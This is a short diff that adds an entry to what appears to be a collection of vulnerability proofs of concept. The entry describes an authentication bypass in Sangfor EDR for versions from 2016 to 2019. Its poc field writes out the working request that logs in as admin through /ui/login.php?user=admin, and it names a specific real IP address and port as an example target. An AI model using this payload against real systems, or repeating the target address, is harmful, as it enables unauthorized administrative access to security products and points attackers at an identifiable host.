@@ -1,0 +1,7 @@
+vendor = "深信服"
+name = "sxf-edr0day只影响 2016-2019 这个版本 任意用户登录"
+type = "认证绕过"
+source = "TG"
+date = "08.15"
+poc = "任意用户登录 {url}/ui/login.php?user=admin https://118.213.240.190:20443/ui/login.php?user=admin"
+label = "nday"
